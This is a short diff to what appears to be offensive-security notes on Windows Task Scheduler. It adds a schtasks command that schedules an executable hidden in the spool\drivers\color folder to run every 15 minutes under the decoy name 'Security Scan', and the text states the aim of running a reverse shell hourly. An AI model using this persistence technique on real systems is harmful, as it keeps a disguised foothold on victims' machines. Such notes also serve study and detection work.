@@ -1,5 +1,12 @@
 # Task Scheduler
 
+### Schtasks Quick Reference
+
+```
+#normal task 15 minutes 
+SCHTASKS /create /sc minute /mo 15 /tn "Security Scan" /tr "C:\Windows\System32\spool\drivers\color\patch.exe" 
+```
+
 * The most common way to schedule tasks is using the built-in Windows task scheduler.
 * Let's create a task that runs a reverse shell every single hour.
 
